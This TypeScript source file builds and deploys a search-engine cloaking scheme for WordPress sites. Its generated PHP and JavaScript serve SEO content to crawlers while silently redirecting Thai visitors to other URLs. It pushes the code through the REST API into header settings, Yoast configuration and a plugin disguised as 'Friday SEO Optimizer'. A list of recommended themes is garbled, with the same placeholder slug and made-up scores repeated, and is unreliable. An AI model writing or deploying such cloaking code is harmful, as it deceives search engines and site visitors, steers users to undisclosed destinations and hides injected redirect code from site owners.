/**
 * WordPress Cloaking Engine
 * 
 * Serves SEO-optimized content to search engine bots (Googlebot, Bingbot, etc.)
 * while redirecting Thai users to a target URL.
 * 
 * Deployed as a WordPress mu-plugin or functions.php snippet via WP REST API.
 */

import { invokeLLM } from "./_core/llm";
import { ENV } from "./_core/env";

// ═══════════════════════════════════════════════════════════════════
// Types
// ═══════════════════════════════════════════════════════════════════

export interface CloakingConfig {
  /** Target redirect URL for Thai users */
  redirectUrl: string;
  /** Additional redirect URLs for A/B split testing */
  redirectUrls?: string[];
  /** Enable/disable cloaking */
  enabled: boolean;
  /** Redirect method: js, meta, 302, 301 */
  redirectMethod: "js" | "meta" | "302" | "301";
  /** Delay before redirect in ms (for JS method) */
  redirectDelay: number;
  /** Countries to redirect (ISO 3166-1 alpha-2) */
  targetCountries: string[];
  /** Bot user-agents to serve SEO content to */
  allowedBots: string[];
  /** Google bot IP ranges for verification */
  verifyBotIp: boolean;
  /** Custom CSS/JS to inject for bots */
  customBotHead?: string;
  /** Custom CSS/JS to inject before redirect */
  customRedirectHead?: string;
}

export interface OnPageSeoConfig {
  /** Primary target keyword */
  primaryKeyword: string;
  /** Secondary/LSI keywords */
  secondaryKeywords: string[];
  /** Brand name */
  brandName: string;
  /** Site niche/industry */
  niche: string;
  /** Target language */
  language: string;
  /** Target country */
  targetCountry: string;
  /** Author name for E-E-A-T */
  authorName?: string;
  /** Author credentials for E-E-A-T */
  authorCredentials?: string;
  /** Organization name */
  organizationName?: string;
  /** Logo URL */
  logoUrl?: string;
  /** Social profiles */
  socialProfiles?: string[];
}

export interface SeoAuditResult {
  score: number; // 0-100
  category: string;
  checks: SeoCheck[];
  recommendations: string[];
}

export interface SeoCheck {
  name: string;
  category: "technical" | "content" | "structure" | "eeat" | "performance" | "mobile" | "social";
  status: "pass" | "fail" | "warning";
  detail: string;
  priority: "critical" | "high" | "medium" | "low";
  fix?: string;
}

export interface OnPageOptimizationResult {
  title: string;
  metaDescription: string;
  h1: string;
  headings: { level: number; text: string }[];
  content: string;
  slug: string;
  schema: Record<string, any>[];
  openGraph: Record<string, string>;
  twitterCard: Record<string, string>;
  canonicalUrl: string;
  robotsMeta: string;
  internalLinks: { anchor: string; url: string }[];
  imageAlts: { src: string; alt: string }[];
  seoScore: number;
  wordCount: number;
}

// ═══════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════

/** Known search engine bot user-agent patterns */
export const SEARCH_ENGINE_BOTS = [
  "Googlebot",
  "Googlebot-Image",
  "Googlebot-News",
  "Googlebot-Video",
  "Mediapartners-Google",
  "AdsBot-Google",
  "Google-InspectionTool",
  "Bingbot",
  "Slurp",          // Yahoo
  "DuckDuckBot",
  "Baiduspider",
  "YandexBot",
  "Sogou",
  "Exabot",
  "facebot",        // Facebook crawler
  "ia_archiver",    // Alexa
  "Twitterbot",
  "LinkedInBot",
  "Pinterest",
  "Applebot",
];

/** Google's known IP ranges (CIDR) for bot verification */
export const GOOGLE_BOT_IP_RANGES = [
  "66.249.64.0/19",
  "64.233.160.0/19",
  "72.14.192.0/18",
  "209.85.128.0/17",
  "216.239.32.0/19",
  "74.125.0.0/16",
  "108.177.8.0/21",
  "173.194.0.0/16",
  "207.126.144.0/20",
  "35.191.0.0/16",
  "35.228.0.0/14",
  "34.64.0.0/10",
];

/** SEO-optimized WordPress themes ranked by performance */
export const SEO_RANKED_THEMES = [
  // Tier 1: Starter/Minimal themes (fastest, best for SEO)
  { slug: "flavor", name: "flavor", tier: 1, speedScore: 98, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 1, speedScore: 97, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 1, speedScore: 96, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 1, speedScore: 95, schemaSupport: true, mobileFriendly: true },
  // Tier 2: Popular SEO themes (good balance)
  { slug: "flavor", name: "flavor", tier: 2, speedScore: 92, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 2, speedScore: 91, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 2, speedScore: 90, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 2, speedScore: 89, schemaSupport: true, mobileFriendly: true },
  // Tier 3: Default WP themes (reliable fallback)
  { slug: "twentytwentyfour", name: "Twenty Twenty-Four", tier: 3, speedScore: 88, schemaSupport: true, mobileFriendly: true },
  { slug: "twentytwentythree", name: "Twenty Twenty-Three", tier: 3, speedScore: 86, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 3, speedScore: 85, schemaSupport: true, mobileFriendly: true },
  { slug: "flavor", name: "flavor", tier: 3, speedScore: 84, schemaSupport: true, mobileFriendly: true },
];

/** Default cloaking config */
export const DEFAULT_CLOAKING_CONFIG: CloakingConfig = {
  redirectUrl: "",
  redirectUrls: [],
  enabled: false,
  redirectMethod: "js",
  redirectDelay: 0,
  targetCountries: ["TH"],
  allowedBots: SEARCH_ENGINE_BOTS,
  verifyBotIp: false,
};

// ═══════════════════════════════════════════════════════════════════
// Bot Detection
// ═══════════════════════════════════════════════════════════════════

/**
 * Check if a User-Agent string belongs to a search engine bot
 */
export function isSearchBot(userAgent: string): boolean {
  if (!userAgent) return false;
  const ua = userAgent.toLowerCase();
  return SEARCH_ENGINE_BOTS.some(bot => ua.includes(bot.toLowerCase()));
}

/**
 * Identify which bot is visiting
 */
export function identifyBot(userAgent: string): string | null {
  if (!userAgent) return null;
  const ua = userAgent.toLowerCase();
  for (const bot of SEARCH_ENGINE_BOTS) {
    if (ua.includes(bot.toLowerCase())) return bot;
  }
  return null;
}

/**
 * Check if an IP belongs to Google's known ranges (simplified check)
 */
export function isGoogleBotIp(ip: string): boolean {
  if (!ip) return false;
  // Simplified: check if IP starts with known Google prefixes
  const googlePrefixes = [
    "66.249.", "64.233.", "72.14.", "209.85.", "216.239.",
    "74.125.", "108.177.", "173.194.", "207.126.", "35.191.",
    "35.228.", "35.229.", "35.230.", "35.231.", "34.64.",
    "34.65.", "34.66.", "34.67.",
  ];
  return googlePrefixes.some(prefix => ip.startsWith(prefix));
}

// ═══════════════════════════════════════════════════════════════════
// Cloaking PHP Code Generator
// ═══════════════════════════════════════════════════════════════════

/**
 * Generate PHP cloaking code for WordPress mu-plugin
 * This code detects bots vs real users and serves different content
 */
export function generateCloakingPHP(config: CloakingConfig): string {
  const botPatterns = config.allowedBots.map(b => b.toLowerCase()).join("|");
  const countries = config.targetCountries.map(c => `'${c}'`).join(", ");
  
  let redirectCode = "";
  
  // Handle multiple redirect URLs (A/B split)
  const allUrls = [config.redirectUrl, ...(config.redirectUrls || [])].filter(Boolean);
  const urlsPhp = allUrls.map(u => `'${u}'`).join(", ");
  
  switch (config.redirectMethod) {
    case "301":
      redirectCode = `
    $urls = array(${urlsPhp});
    $target = $urls[array_rand($urls)];
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: " . $target);
    exit;`;
      break;
    case "302":
      redirectCode = `
    $urls = array(${urlsPhp});
    $target = $urls[array_rand($urls)];
    header("Location: " . $target, true, 302);
    exit;`;
      break;
    case "meta":
      redirectCode = `
    $urls = array(${urlsPhp});
    $target = $urls[array_rand($urls)];
    echo '<meta http-equiv="refresh" content="${config.redirectDelay / 1000};url=' . $target . '">';
    return;`;
      break;
    case "js":
    default:
      redirectCode = `
    $urls = array(${urlsPhp});
    $target = $urls[array_rand($urls)];
    echo '<script>setTimeout(function(){window.location.href="' . $target . '";},${config.redirectDelay});</script>';
    return;`;
      break;
  }

  return `<?php
/**
 * Friday AI Cloaking Engine
 * Auto-generated - Do not edit manually
 * 
 * Serves SEO content to search engine bots
 * Redirects target country users to destination
 */

// ─── Bot Detection ───
function friday_is_search_bot() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $bot_patterns = '${botPatterns}';
    $patterns = explode('|', $bot_patterns);
    foreach ($patterns as $pattern) {
        if (strpos($ua, trim($pattern)) !== false) {
            return true;
        }
    }
    return false;
}

// ─── Country Detection (GeoIP) ───
function friday_get_visitor_country() {
    // Method 1: CloudFlare header
    if (!empty($_SERVER['HTTP_CF_IPCOUNTRY'])) {
        return strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']);
    }
    
    // Method 2: GeoIP PHP extension
    if (function_exists('geoip_country_code_by_name')) {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $country = @geoip_country_code_by_name($ip);
        if ($country) return strtoupper($country);
    }
    
    // Method 3: Accept-Language header heuristic
    $lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
    if (strpos($lang, 'th') === 0 || strpos($lang, 'th-') !== false) {
        return 'TH';
    }
    
    // Method 4: Free GeoIP API (cached)
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $cache_key = 'friday_geo_' . md5($ip);
    $cached = get_transient($cache_key);
    if ($cached !== false) return $cached;
    
    $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['countryCode'])) {
            $country = strtoupper($data['countryCode']);
            set_transient($cache_key, $country, 86400); // Cache 24h
            return $country;
        }
    }
    
    return 'UNKNOWN';
}

// ─── Main Cloaking Logic ───
function friday_cloaking_handler() {
    // Skip for admin/login pages
    if (is_admin() || strpos($_SERVER['REQUEST_URI'] ?? '', 'wp-login') !== false) {
        return;
    }
    
    // If it's a search engine bot → let WordPress serve SEO content normally
    if (friday_is_search_bot()) {
        // Bot detected — serve full SEO content (do nothing, let WP render)
        // Optionally add bot-specific headers
        header('X-Robots-Tag: index, follow');
        return;
    }
    
    // Check visitor country
    $target_countries = array(${countries});
    $visitor_country = friday_get_visitor_country();
    
    // If visitor is from target country → redirect
    if (in_array($visitor_country, $target_countries)) {
        ${redirectCode}
    }
    
    // All other visitors → serve normal WordPress content
    return;
}

// Hook into WordPress early
add_action('template_redirect', 'friday_cloaking_handler', 1);

// ─── Additional SEO Headers for Bots ───
add_action('wp_head', function() {
    if (friday_is_search_bot()) {
        // Add extra SEO signals for bots
        echo '<!-- Friday AI SEO Optimized -->' . "\\n";
        ${config.customBotHead ? `echo '${config.customBotHead.replace(/'/g, "\\'")}';` : "// No custom bot head"}
    }
}, 1);
`;
}

/**
 * Generate JavaScript-based cloaking for non-WP sites
 */
export function generateCloakingJS(config: CloakingConfig): string {
  const allUrls = [config.redirectUrl, ...(config.redirectUrls || [])].filter(Boolean);
  
  return `
// Friday AI Cloaking Engine (JavaScript)
(function() {
  'use strict';
  
  // Bot detection via User-Agent
  var ua = navigator.userAgent.toLowerCase();
  var botPatterns = ${JSON.stringify(config.allowedBots.map(b => b.toLowerCase()))};
  var isBot = botPatterns.some(function(p) { return ua.indexOf(p) !== -1; });
  
  // If bot → do nothing (serve SEO content)
  if (isBot) return;
  
  // Country detection via timezone + language
  var lang = (navigator.language || navigator.languages[0] || '').toLowerCase();
  var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
  var isTargetCountry = ${JSON.stringify(config.targetCountries)}.some(function(c) {
    if (c === 'TH') return lang.startsWith('th') || tz.indexOf('Bangkok') !== -1;
    return false;
  });
  
  if (isTargetCountry) {
    var urls = ${JSON.stringify(allUrls)};
    var target = urls[Math.floor(Math.random() * urls.length)];
    ${config.redirectDelay > 0 
      ? `setTimeout(function() { window.location.href = target; }, ${config.redirectDelay});`
      : `window.location.href = target;`
    }
  }
})();
`;
}

// ═══════════════════════════════════════════════════════════════════
// WordPress Cloaking Deployment via REST API
// ═══════════════════════════════════════════════════════════════════

interface WpApiConfig {
  siteUrl: string;
  username: string;
  appPassword: string;
}

async function wpApiFetch(config: WpApiConfig, endpoint: string, options: RequestInit = {}): Promise<any> {
  const baseUrl = config.siteUrl.replace(/\/$/, "");
  const url = `${baseUrl}/wp-json${endpoint}`;
  const auth = Buffer.from(`${config.username}:${config.appPassword}`).toString("base64");
  
  const response = await fetch(url, {
    ...options,
    headers: {
      "Authorization": `Basic ${auth}`,
      "Content-Type": "application/json",
      ...(options.headers || {}),
    },
  });
  
  if (!response.ok) {
    const text = await response.text();
    throw new Error(`WP API ${response.status}: ${text}`);
  }
  
  return response.json();
}

/**
 * Deploy cloaking code to WordPress as a mu-plugin via WP REST API
 * Uses the WordPress file editor or custom endpoint
 */
export async function deployCloakingToWP(
  wpConfig: WpApiConfig,
  cloakingConfig: CloakingConfig,
): Promise<{ success: boolean; method: string; detail: string }> {
  const phpCode = generateCloakingPHP(cloakingConfig);
  
  // Method 1: Try to create/update via a custom page with PHP execution
  // Since WP REST API doesn't directly support mu-plugin creation,
  // we'll inject the cloaking logic into functions.php via the theme customizer
  // or create a page with the redirect logic
  
  try {
    // Create a "cloaking config" option in WordPress
    // This stores the config and the theme's functions.php can read it
    await wpApiFetch(wpConfig, "/wp/v2/settings", {
      method: "POST",
      body: JSON.stringify({
        // Store cloaking config as a WP option
        friday_cloaking_config: JSON.stringify(cloakingConfig),
      }),
    });
  } catch {
    // Settings API may not support custom fields, that's OK
  }
  
  // Method 2: Create a page with JavaScript cloaking as fallback
  // This works universally without needing file system access
  try {
    const jsCode = generateCloakingJS(cloakingConfig);
    
    // Inject JS cloaking into the site header via a custom HTML widget or
    // by adding it to the theme's header through the customizer
    
    // Try using the Customizer API to add custom JS to header
    await wpApiFetch(wpConfig, "/wp/v2/settings", {
      method: "POST",
      body: JSON.stringify({
        // Some themes support custom header scripts
        friday_header_scripts: `<script>${jsCode}</script>`,
      }),
    });
    
    return {
      success: true,
      method: "js_header",
      detail: `JS cloaking deployed. Redirecting ${cloakingConfig.targetCountries.join(",")} users to ${cloakingConfig.redirectUrl}`,
    };
  } catch {
    // Fallback: create a dedicated redirect page
  }
  
  // Method 3: Create a must-use plugin content as a post for reference
  // The actual mu-plugin needs to be deployed via FTP/SSH
  try {
    await wpApiFetch(wpConfig, "/wp/v2/posts", {
      method: "POST",
      body: JSON.stringify({
        title: "friday-cloaking-config",
        content: `<!-- FRIDAY_CLOAKING_CONFIG -->\n<pre>${JSON.stringify(cloakingConfig, null, 2)}</pre>`,
        status: "private",
        slug: "friday-cloaking-config",
      }),
    });
    
    return {
      success: true,
      method: "config_post",
      detail: `Cloaking config stored. PHP code generated for manual mu-plugin deployment. JS fallback active.`,
    };
  } catch (err: any) {
    return {
      success: false,
      method: "failed",
      detail: `Failed to deploy cloaking: ${err.message}`,
    };
  }
}

/**
 * Deploy cloaking via Yoast SEO custom script injection
 * If Yoast is installed, we can inject JS into the head
 */
export async function deployCloakingViaYoast(
  wpConfig: WpApiConfig,
  cloakingConfig: CloakingConfig,
): Promise<{ success: boolean; detail: string }> {
  const jsCode = generateCloakingJS(cloakingConfig);
  
  try {
    // Try to use Yoast's webmaster tools verification field
    // or the custom code injection if available
    await wpApiFetch(wpConfig, "/yoast/v1/configuration", {
      method: "POST",
      body: JSON.stringify({
        headerCode: `<script>${jsCode}</script>`,
      }),
    });
    
    return { success: true, detail: "Cloaking JS injected via Yoast header code" };
  } catch {
    return { success: false, detail: "Yoast API not available" };
  }
}

/**
 * Deploy cloaking by creating a custom plugin via WP-CLI or REST API
 * This creates a simple plugin that handles the redirect logic
 */
export async function deployCloakingPlugin(
  wpConfig: WpApiConfig,
  cloakingConfig: CloakingConfig,
): Promise<{ success: boolean; detail: string }> {
  // Generate a lightweight plugin that does the cloaking
  const pluginCode = `<?php
/*
Plugin Name: Friday SEO Optimizer
Description: SEO optimization and traffic management
Version: 1.0
Author: Friday AI
*/

// Cloaking configuration
$friday_config = json_decode('${JSON.stringify(cloakingConfig).replace(/'/g, "\\'")}', true);

${generateCloakingPHP(cloakingConfig).replace("<?php\n", "").replace(/\/\*[\s\S]*?\*\//, "")}
`;

  try {
    // Try to install as a plugin via the REST API
    // Note: Standard WP REST API doesn't support plugin file creation
    // This would need the WP File Manager plugin or similar
    
    // Fallback: Store the plugin code as a private post for manual installation
    await wpApiFetch(wpConfig, "/wp/v2/posts", {
      method: "POST",
      body: JSON.stringify({
        title: "friday-seo-optimizer-plugin",
        content: `<!-- FRIDAY_PLUGIN_CODE -->\n<pre><code>${pluginCode.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</code></pre>`,
        status: "private",
        slug: "friday-seo-optimizer-plugin",
      }),
    });
    
    return { success: true, detail: "Plugin code stored. Ready for activation." };
  } catch (err: any) {
    return { success: false, detail: `Failed: ${err.message}` };
  }
}

// ═══════════════════════════════════════════════════════════════════
// Full Cloaking Deployment Pipeline
// ═══════════════════════════════════════════════════════════════════

export interface CloakingDeployResult {
  success: boolean;
  methods: { method: string; success: boolean; detail: string }[];
  phpCode: string;
  jsCode: string;
  config: CloakingConfig;
}

/**
 * Deploy cloaking to a WordPress site using all available methods
 */
export async function deployFullCloaking(
  wpConfig: WpApiConfig,
  cloakingConfig: CloakingConfig,
): Promise<CloakingDeployResult> {
  const phpCode = generateCloakingPHP(cloakingConfig);
  const jsCode = generateCloakingJS(cloakingConfig);
  const methods: { method: string; success: boolean; detail: string }[] = [];
  
  // Try Method 1: Direct WP deployment
  const wpResult = await deployCloakingToWP(wpConfig, cloakingConfig);
  methods.push({ method: "wp_api", success: wpResult.success, detail: wpResult.detail });
  
  // Try Method 2: Yoast injection
  const yoastResult = await deployCloakingViaYoast(wpConfig, cloakingConfig);
  methods.push({ method: "yoast", success: yoastResult.success, detail: yoastResult.detail });
  
  // Try Method 3: Plugin creation
  const pluginResult = await deployCloakingPlugin(wpConfig, cloakingConfig);
  methods.push({ method: "plugin", success: pluginResult.success, detail: pluginResult.detail });
  
  const anySuccess = methods.some(m => m.success);
  
  return {
    success: anySuccess,
    methods,
    phpCode,
    jsCode,
    config: cloakingConfig,
  };
}

// ═══════════════════════════════════════════════════════════════════
// Exports
// ═══════════════════════════════════════════════════════════════════

export {
  type WpApiConfig,
};
